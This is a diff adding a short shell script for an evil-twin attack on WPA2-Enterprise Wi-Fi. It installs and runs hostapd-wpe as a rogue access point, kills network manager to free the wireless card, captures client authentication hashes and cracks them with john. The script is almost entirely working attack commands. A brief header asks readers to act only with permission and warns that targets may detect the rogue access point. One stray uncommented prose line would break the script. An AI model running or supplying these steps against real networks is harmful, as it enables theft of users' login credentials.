@@ -1,0 +1,38 @@
+# Evil Twin for WPA2-ENTERPRISE pwnage
+# Script created by MrR3b00t
+# Remember to customise the conf for your target. The client may have evil twin detection and the user may log a ticket about not being able to connect so use with caution.
+# hack responsibly. Only pwn what you have permission 2! Don't break the CMA or other laws relevent to you!
+# Hack4G00d
+ 
+sudo apt-get install hostapd
+ 
+#freeradius is superceeded by hostapd-wpe
+#sudo apt-get install freeradius
+ 
+sudo apt install hostapd-wpe
+ 
+ 
+#to renew certs
+ 
+#openssl ca -batch -keyfile ca.key -cert ca.pem -in client.csr  -key 'whatever' -out client.crt -extensions xpclient_ext -extfile xpextensions -config ./client.cnf
+ 
+#openssl pkcs12 -export -in client.crt -inkey client.key -out client.p12  -passin pass:'whatever' -passout pass:'whatever'
+ 
+#modify the config
+ 
+#nano /etc/hostapd-wpe/hostapd-wpe.conf
+ 
+#kill network manager
+airmon-ng check kill
+ 
+hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+ 
+#wait for a client to authenticate
+ 
+once the hashes are captured crack with john
+john test.hash --show --format=netntlm
+ 
+#log file is:cat /root/hostapd-wpe.log
+
+
+#cleary you can use other configs such as EAPHAMMER
